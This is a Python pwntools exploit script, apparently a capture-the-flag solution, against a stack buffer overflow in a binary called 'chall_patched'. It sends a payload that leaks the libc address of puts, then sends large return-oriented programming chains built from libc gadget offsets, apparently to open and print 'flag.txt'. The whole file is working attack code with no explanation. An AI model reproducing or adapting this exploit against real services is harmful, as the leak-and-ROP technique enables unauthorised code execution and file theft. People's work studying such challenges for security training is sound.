#!/usr/bin/env python3
from pwn import *

"""

"""
context.terminal = ["tmux", "new-window"]

bin = ELF("./chall_patched",checksec=False)
libc = ELF("./libc.so.6",checksec=False)

context.binary = bin

def conn():
    if args.GDB:
        io = gdb.debug([bin.path], gdbscript='''
        b*vuln+107
        c
        ''')
    elif args.REMOTE:
        io = remote("", )
    else:
        io = process([bin.path])
    return io

def main(io):
    
    pld = b"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xc3\x12\x40\x00\x00\x00\x00\x00\x18\x40\x40\x00\x00\x00\x00\x00\x64\x10\x40\x00\x00\x00\x00\x00\x29\x12\x40\x00\x00\x00\x00\x00"
    io.sendlineafter(b"Please leave a comment: \n",pld)

    print(hex(libc.symbols['puts'] ))

    leak = u64((io.recv(6).ljust(8, b'\x00')))
    info("Leaked libc address,  puts: "+ hex(leak))
    libc.address = leak - libc.symbols['puts'] 
    info("libc base @ %s" % hex(libc.address))

    pld2 = p64(0x4141414141414141)+ p64(0x4141414141414141)+ p64(0x4141414141414141)+ p64(0x4141414141414141)+ p64(0x4141414141414141)+ p64(0x4141414141414141)+ p64(0x4141414141414141)+ p64(0x4141414141414141)+ p64(0x4141414141414141)+ p64(libc.address + 0x23b6a)+ p64(0x0)+ p64(libc.address + 0x2601f)+ p64(0x404210)+ p64(libc.address + 0x142c92)+ p64(0x1000)+ p64(libc.address + 0x10dfc0)+ p64(libc.address + 0x8e231)+ p64(0x404210)    
    io.sendlineafter(b"Please leave a comment: \n",pld2)

    pld3 = p64(0xf00dbabe)+ p64(libc.address + 0x36174)+ p64(0x4041ff)+ p64(libc.address + 0x8e231)+ p64(0x404238)+ p64(0xf00dbabe)+ p64(libc.address + 0x23b6a)+ p64(0x67616c66)+ p64(libc.address + 0x8e231)+ p64(0x404260)+ p64(0xf00dbabe)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x8e231)+ p64(0x404280)+ p64(0xf00dbabe)+ p64(libc.address + 0x36174)+ p64(0x404203)+ p64(libc.address + 0x8e231)+ p64(0x4042a8)+ p64(0xf00dbabe)+ p64(libc.address + 0x23b6a)+ p64(0x7478742e)+ p64(libc.address + 0x8e231)+ p64(0x4042d0)+ p64(0xf00dbabe)+ p64(libc.address + 0xec3f0)+ p64(libc.address + 0x8e231)+ p64(0x4042f0)+ p64(0xf00dbabe)+ p64(libc.address + 0x23b6a)+ p64(0x404200)+ p64(libc.address + 0x8e231)+ p64(0x404318)+ p64(0xf00dbabe)+ p64(libc.address + 0x2601f)+ p64(0x0)+ p64(libc.address + 0x8e231)+ p64(0x404340)+ p64(0xf00dbabe)+ p64(libc.address + 0x10dce0)+ p64(libc.address + 0x8e231)+ p64(0x404360)+ p64(0xf00dbabe)+ p64(libc.address + 0x142c92)+ p64(0x80)+ p64(libc.address + 0x8e231)+ p64(0x404388)+ p64(0xf00dbabe)+ p64(libc.address + 0x10257e)+ p64(0xf00db4b3)+ p64(0xf00db4b3)+ p64(libc.address + 0x8e231)+ p64(0x4043b8)+ p64(0xf00dbabe)+ p64(libc.address + 0x5b622)+ p64(libc.address + 0x8e231)+ p64(0x4043d8)+ p64(0xf00dbabe)+ p64(libc.address + 0x2601f)+ p64(0x404a00)+ p64(libc.address + 0x8e231)+ p64(0x404400)+ p64(0xf00dbabe)+ p64(libc.address + 0x10dfc0)+ p64(libc.address + 0x8e231)+ p64(0x404420)+ p64(0xf00dbabe)+ p64(libc.address + 0x10257e)+ p64(0x404a29)+ p64(0xdeadbeefcafebabe)+ p64(libc.address + 0x8e231)+ p64(0x404450)+ p64(0xf00dbabe)+ p64(libc.address + 0x1930b3)+ p64(libc.address + 0x8e231)+ p64(0x404470)+ p64(0xf00dbabe)+ p64(libc.address + 0x23b6a)+ p64(0xda609d80)+ p64(libc.address + 0x8e231)+ p64(0x404498)+ p64(0xf00dbabe)+ p64(libc.address + 0x36174)+ p64(0x4049ff)+ p64(libc.address + 0x8e231)+ p64(0x4044c0)+ p64(0xf00dbabe)+ p64(libc.address + 0xe81c7)+ p64(libc.address + 0x8e231)+ p64(0x4044e0)+ p64(0xf00dbabe)+ p64(libc.address + 0x23b6a)+ p64(0x664f724b)+ p64(libc.address + 0x8e231)+ p64(0x404508)+ p64(0xf00dbabe)+ p64(libc.address + 0x36174)+ p64(0x404a03)+ p64(libc.address + 0x8e231)+ p64(0x404530)+ p64(0xf00dbabe)+ p64(libc.address + 0xe81c7)+ p64(libc.address + 0x8e231)+ p64(0x404550)+ p64(0xf00dbabe)+ p64(libc.address + 0x23b6a)+ p64(0xeac895da)+ p64(libc.address + 0x8e231)+ p64(0x404578)+ p64(0xf00dbabe)+ p64(libc.address + 0x36174)+ p64(0x404a07)+ p64(libc.address + 0x8e231)+ p64(0x4045a0)+ p64(0xf00dbabe)+ p64(libc.address + 0xe81c7)+ p64(libc.address + 0x8e231)+ p64(0x4045c0)+ p64(0xf00dbabe)+ p64(libc.address + 0x23b6a)+ p64(0xca35c161)+ p64(libc.address + 0x8e231)+ p64(0x4045e8)+ p64(0xf00dbabe)+ p64(libc.address + 0x36174)+ p64(0x404a0b)+ p64(libc.address + 0x8e231)+ p64(0x404610)+ p64(0xf00dbabe)+ p64(libc.address + 0xe81c7)+ p64(libc.address + 0x8e231)+ p64(0x404630)+ p64(0xf00dbabe)+ p64(libc.address + 0x23b6a)+ p64(0xed33bc45)+ p64(libc.address + 0x8e231)+ p64(0x404658)+ p64(0xf00dbabe)+ p64(libc.address + 0x36174)+ p64(0x404a0f)+ p64(libc.address + 0x8e231)+ p64(0x404680)+ p64(0xf00dbabe)+ p64(libc.address + 0xe81c7)+ p64(libc.address + 0x8e231)+ p64(0x4046a0)+ p64(0xf00dbabe)+ p64(libc.address + 0x23b6a)+ p64(0xd1f4c382)+ p64(libc.address + 0x8e231)+ p64(0x4046c8)+ p64(0xf00dbabe)+ p64(libc.address + 0x36174)+ p64(0x404a13)+ p64(libc.address + 0x8e231)+ p64(0x4046f0)+ p64(0xf00dbabe)+ p64(libc.address + 0xe81c7)+ p64(libc.address + 0x8e231)+ p64(0x404710)+ p64(0xf00dbabe)+ p64(libc.address + 0x23b6a)+ p64(0xd24388a5)+ p64(libc.address + 0x8e231)+ p64(0x404738)+ p64(0xf00dbabe)+ p64(libc.address + 0x36174)+ p64(0x404a17)+ p64(libc.address + 0x8e231)+ p64(0x404760)+ p64(0xf00dbabe)+ p64(libc.address + 0xe81c7)+ p64(libc.address + 0x8e231)+ p64(0x404780)+ p64(0xf00dbabe)+ p64(libc.address + 0x23b6a)+ p64(0x1394f4c3)+ p64(libc.address + 0x8e231)+ p64(0x4047a8)+ p64(0xf00dbabe)+ p64(libc.address + 0x36174)+ p64(0x404a1b)+ p64(libc.address + 0x8e231)+ p64(0x4047d0)+ p64(0xf00dbabe)+ p64(libc.address + 0xe81c7)+ p64(libc.address + 0x8e231)+ p64(0x4047f0)+ p64(0xf00dbabe)+ p64(libc.address + 0x23b6a)+ p64(0x1)+ p64(libc.address + 0x8e231)+ p64(0x404818)+ p64(0xf00dbabe)+ p64(libc.address + 0x142c92)+ p64(0x404998)+ p64(libc.address + 0x8e231)+ p64(0x404840)+ p64(0xf00dbabe)+ p64(libc.address + 0x55065)+ p64(libc.address + 0x8e231)+ p64(0x404860)+ p64(0xf00dbabe)+ p64(libc.address + 0x10e060)+ p64(libc.address + 0x8e231)+ p64(0x404880)
    io.sendline(pld3)

    io.interactive()


if __name__ == "__main__":
    io = conn()
    main(io)
